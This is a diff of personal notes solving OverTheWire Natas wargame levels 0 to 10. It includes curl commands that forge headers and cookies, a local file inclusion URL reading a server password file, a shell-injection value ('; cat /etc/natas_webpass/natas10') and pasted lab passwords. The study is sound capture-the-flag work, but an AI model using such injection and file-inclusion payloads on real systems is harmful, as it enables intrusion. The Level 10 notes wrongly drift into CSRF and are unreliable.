@@ -5,6 +5,31 @@ Creation-Date: 2019-01-02T08:23:11-05:00
 ====== Natas ======
 Created Wednesday 02 January 2019
 
+==== Curl Tutorial ====
+
+request HTML from website
+curl site.com
+
+response headers only
+curl -I site.com
+
+show all headers and output
+curl --verbose site.com
+
+basic authentication
+curl --user [[username:password]] site.com
+
+print received cookies to stdout
+$ curl --cookie-jar - site.com
+
+modify cookies
+$ curl --cookie "loggedin=1" --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq http://natas5.natas.labs.overthewire.org
+
+==== Cookies ====
+https://www.morevisibility.com/blogs/analytics/from-__utma-to-__utmz-google-analytics-cookies.html
+Cookies that start with __utma or __utmz are google analytic cookies.
+
+
 ==== Level 0 ====
 The first few passwords can be obtained by exploiting Information Leaks on the web server.
 
@@ -50,5 +75,139 @@ If we click on the "Refresh page" button, we instead get the following message.
 
 Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" 
 
-The "Refresh page" button simply takes whatever value is in the search bar and uses it in the message. So using natas5.natas.labs.overthewire.org/index.php.
+Using chrome we see that after refreshing the page, their are two relevant HTTP request headers.
+
+{{./pasted_image001.png}}
+
+We can use curl to modify an HTTP request to forge the referer header, which is what the server is looking at.
+
+tpulliam@lappy:~$ curl --verbose --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ --header 'Referer: http://natas5.natas.labs.overthewire.org/' natas4.natas.labs.overthewire.org
+...
+...
+Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+==== Level 5 ====
+
+Sending a get request, we get the following message.
+
+Access disallowed. You are not logged in
+
+Interesting. Cookies are used for checking whether a user is logged in or not. Looking at the headers, we see that in the cookies, value loggedin is set to 0. Lets change that.
+
+Cookie: __cfduid=d4bb41f62443102e477f8bbdc7149e6371546559541; __utmc=176859643; __utmz=176859643.1546559542.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utma=176859643.562963145.1546559542.1546559542.1546561586.2; __utmb=176859643.1.10.1546561586; **loggedin=0**
+
+tpulliam@lappy:~$ curl --cookie "loggedin=1" --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq http://natas5.natas.labs.overthewire.org
+
+Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+==== Level 6 ====
+
+{{./pasted_image002.png}}
+
+
+View source code brings our attention to includes/secret.inc.
+
+http://natas6.natas.labs.overthewire.org/includes/secret.inc
+
+<?
+$secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+
+Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+==== Level 7 ====
+
+Viewing the source
+
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+
+This exploit is known as Local File Inclusion.
+https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion
+
+Modifying the URL, we can instruct the server to retrieve the password file.
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+==== Level 8 ====
+
+{{./pasted_image003.png}}
+
+Viewingthe source code, we see there is an encoded/encrypted secret.
+
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function encodeSecret($secret) {
+	return bin2hex(strrev(base64_encode($secret)));
+}
+
+if(array_key_exists("submit", $_POST)) {
+	if(encodeSecret($_POST['secret']) == $encodedSecret) {
+	print "Access granted. The password for natas9 is <censored>";
+	} else {
+	print "Wrong secret";
+	}
+}
+?>
+
+Spun up a kali linux docker container and ran php in interactive mode.
+
+root@3655008a1405:/# php -v
+PHP 7.3.0-2 (cli) (built: Dec 17 2018 09:51:53) ( NTS )
+root@3655008a1405:/# php -a
+Interactive mode enabled
+
+php > print(base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362'))));
+oubWYf2kBq
+
+
+Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+==== Level 9 ====
+
+PHP BASH injection
+
+if($key != "") {
+	passthru("grep -i $key dictionary.txt");
+}
+
+https://secure.php.net/manual/en/function.passthru.php
+Viewing the source code, we see that the php code executes some BASH shell code via the php passthru function. This function does not sanitize input.
+
+Warning
+When allowing user-supplied data to be passed to this function, use escapeshellarg() or escapeshellcmd() to ensure that users cannot trick the system into executing arbitrary commands.
+
+Easy enough, we can inject some bash code.
+
+poop; cat /etc/natas_webpass/natas10
+
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+==== Level 10 ====
+
+Similar to last level. Except now, characters [[/[;|&]/]] are forbidden as input. This makes our injection a bit more tricky.
+https://secure.php.net/manual/en/function.preg-match.php
+
+if($key != "") {
+	if(preg_match('/[;|&]/',$key)) {
+		print "Input contains an illegal character!";
+	} else {
+		passthru("grep -i $key dictionary.txt");
+	}
+}
+
+https://bugs.php.net/bug.php?id=69274
+
+
+This level is vulnerable to Cross Site Request Forgery.
+https://stackoverflow.com/questions/2142497/whats-wrong-with-using-request
+
+$_REQUEST is one of the biggest design weaknesses in PHP. Every application using $_REQUEST is most probably vulnerable to Delayed Cross Site Request Forgery problems. (This basically means if e.g. a cookie named (age) exists it will always overwrite the GET/POST content and therefore unwanted requests will be performed)
+
+It is not about the fact that someone can forge GET, POST; COOKIE variables. It is about the fact that COOKIEs will overwrite GET and POST data in REQUEST.
+
+Therefore I could infect your browser with a cookie that says e.g. action=logout and from that day on you cannot use the application anymore because REQUEST[action] will be logout forever (until you manually delete the cookie).
+
+How to execute the forgery
+https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
 
